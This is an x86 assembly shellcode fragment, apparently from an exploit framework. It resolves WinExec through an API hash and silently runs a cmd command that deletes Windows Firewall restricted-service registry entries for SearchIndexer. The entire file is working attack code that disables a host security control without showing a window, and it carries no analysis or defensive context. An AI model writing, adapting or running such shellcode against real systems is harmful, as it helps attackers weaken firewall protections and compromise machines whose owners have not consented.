[BITS 32]
[ORG 0]

  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
delta:                   ;
%include "block_api.asm" ; 
start:                   ;
  pop ebp                ; Pop off the address of 'api_call' for calling later.
  push byte 0            ; uCmdShow = 0 - Don't show a CMD window
  lea eax, [ebp+command-delta]
  push eax               ;
  push 0x876F8B31        ; hash( "kernel32.dll", "WinExec" )
  call ebp               ; WinExec( &command, 0 );
  jmp continue
command:
  db 'cmd /c "reg delete HKLM\SYSTEM\CurrentControlSet\services\SharedAccess\Parameters\FirewallPolicy\RestrictedServices\Static\System /v SearchIndexer-1 /f & reg delete HKLM\SYSTEM\CurrentControlSet\services\SharedAccess\Parameters\FirewallPolicy\RestrictedServices\Static\System /v SearchIndexer-2 /f"', 0
continue:
  ; Woohoo